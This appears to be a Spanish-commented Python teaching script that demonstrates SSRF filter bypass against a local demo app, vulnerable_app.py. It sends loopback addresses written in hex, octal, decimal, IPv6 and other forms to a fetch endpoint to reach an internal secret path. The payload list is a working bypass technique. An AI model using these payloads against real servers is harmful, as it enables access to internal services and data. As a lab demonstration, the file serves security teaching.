"""
attack_demo.py
--------------
Demuestra cómo el filtro basado en regex/string de vulnerable_app.py
puede ser evadido usando representaciones alternativas de 127.0.0.1.

Requisito: tener vulnerable_app.py corriendo en http://localhost:5000

Correr:
    python attack_demo.py
"""

import requests

TARGET = "http://localhost:5000/fetch"

# 127.0.0.1 expresado de formas que el regex no reconoce como "127.0.0.1"
PAYLOADS = {
    "Control: IP literal (deberia bloquearse)": "http://127.0.0.1:5000/internal/secret",
    "Hexadecimal":                               "http://0x7f000001:5000/internal/secret",
    "Octal":                                      "http://0177.0.0.1:5000/internal/secret",
    "Decimal (entero de 32 bits)":                 "http://2130706433:5000/internal/secret",
    "IPv6 loopback":                               "http://[::1]:5000/internal/secret",
    "IPv4 mapeada a IPv6":                         "http://[::ffff:127.0.0.1]:5000/internal/secret",
    "Punto final (fully qualified)":               "http://127.0.0.1.:5000/internal/secret",
    "Mezcla octal/decimal por octeto":             "http://127.0.0.0x1:5000/internal/secret",
}

def main():
    print(f"Atacando {TARGET}\n" + "-" * 60)
    for name, payload in PAYLOADS.items():
        try:
            r = requests.get(TARGET, params={"url": payload}, timeout=5)
            bypass = r.status_code == 200
            marca = "BYPASS ✅" if bypass else "bloqueado"
            print(f"[{marca}] {name}")
            print(f"    url:  {payload}")
            print(f"    resp: {r.status_code} {r.text[:120]}\n")
        except Exception as e:
            print(f"[error] {name}: {e}\n")

if __name__ == "__main__":
    main()
